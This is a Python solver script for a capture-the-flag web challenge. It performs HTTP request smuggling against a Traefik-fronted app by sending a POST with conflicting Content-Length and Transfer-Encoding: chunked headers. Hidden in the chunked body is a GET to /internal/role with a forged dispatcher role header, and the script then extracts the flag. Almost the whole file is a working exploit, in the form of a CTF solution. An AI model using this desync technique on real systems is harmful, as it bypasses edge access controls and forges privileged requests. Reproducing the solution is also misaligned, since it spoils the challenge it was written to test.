#!/usr/bin/env python3
"""Tracking solver: send one request that the edge and the application read differently.

The instance endpoint is TLS (tcp-ssl expose), so the raw socket is wrapped before
the bytes go out. Traefik terminates TLS and forwards the stream untouched, which is
exactly what lets the two parsers disagree.
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import ssl
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse

CHALLENGE_ID = "packswift-tracking"

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

FILLER = b"id=PS-1042&"
SMUGGLED = (
    b"GET /internal/role HTTP/1.1\r\n"
    b"Host: t\r\n"
    b"X-PackSwift-Role: dispatcher\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)


def build_request() -> bytes:
    chunk = FILLER + SMUGGLED
    hex_size = f"{len(chunk):x}".encode()
    # The application reads this many bytes after the header block, which ends exactly
    # at the first byte of the request carried inside the chunked body.
    length = len(hex_size) + 2 + len(FILLER)
    head = (
        b"POST /track HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Content-Length: " + str(length).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
    )
    return head + hex_size + b"\r\n" + chunk + b"\r\n0\r\n\r\n"


def start_instance(platform_url: str, token: str, challenge_id: str) -> str:
    """Start the team's instance if needed and return its public base URL."""
    base = platform_url.rstrip("/")
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "ingehack-solver/1.0",
    }
    status_url = f"{base}/api/v2/integrations/challs/{challenge_id}/instance"

    def read_status() -> dict:
        request = urllib.request.Request(status_url, headers=headers)
        with urllib.request.urlopen(request, timeout=20) as response:
            return (json.load(response).get("data") or {})

    try:
        data = read_status()
        if data.get("status") == "stopped":
            request = urllib.request.Request(
                status_url,
                data=b"{}",
                headers={**headers, "Content-Type": "application/json"},
                method="PUT",
            )
            with urllib.request.urlopen(request, timeout=20) as response:
                data = (json.load(response).get("data") or {})
            print("instance starting", file=sys.stderr)
            deadline = time.monotonic() + 120
            while time.monotonic() < deadline:
                if data.get("status") == "running":
                    break
                if data.get("status") in ("errored", "stopping"):
                    raise RuntimeError(f"instance {data.get('status')}")
                time.sleep(3)
                data = read_status()
    except urllib.error.URLError as error:
        raise RuntimeError(f"cannot reach the platform: {error}") from error

    endpoints = data.get("endpoints") or []
    if not endpoints:
        raise RuntimeError("the instance has no public endpoint")
    endpoint = endpoints[0]
    scheme = "http" if endpoint.get("kind") == "http" else "https"
    return f"{scheme}://{endpoint['host']}:{endpoint['port']}/"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", help="instance URL, or omit and pass the platform flags")
    parser.add_argument("--platform-url", help="platform base URL, for example https://ctf.ingeniums.club")
    parser.add_argument("--token", help="player API token used to start the instance")
    parser.add_argument("--challenge-id", default=CHALLENGE_ID)
    args = parser.parse_args()

    base_url = args.base_url
    if not base_url:
        if not args.platform_url or not args.token:
            print(
                "solver: pass --base-url, or --platform-url and --token to start the instance",
                file=sys.stderr,
            )
            return 2
        try:
            base_url = start_instance(args.platform_url, args.token, args.challenge_id)
        except RuntimeError as error:
            print(f"solver: {error}", file=sys.stderr)
            return 1
        print(f"instance: {base_url}", file=sys.stderr)

    parsed = urlparse(base_url)
    if parsed.hostname is None:
        print("solver: the base URL has no host", file=sys.stderr)
        return 1
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https" or port == 9450

    data = b""
    try:
        with socket.create_connection((parsed.hostname, port), timeout=10) as raw:
            sock = raw
            if use_tls:
                context = ssl.create_default_context()
                sock = context.wrap_socket(raw, server_hostname=parsed.hostname)
            sock.settimeout(10)
            sock.sendall(build_request())
            while True:
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
    except OSError as error:
        print(f"solver: request failed: {error}", file=sys.stderr)
        return 1

    match = FLAG.search(data.decode("latin-1", "replace"))
    if not match:
        print("solver: no flag in the response", file=sys.stderr)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
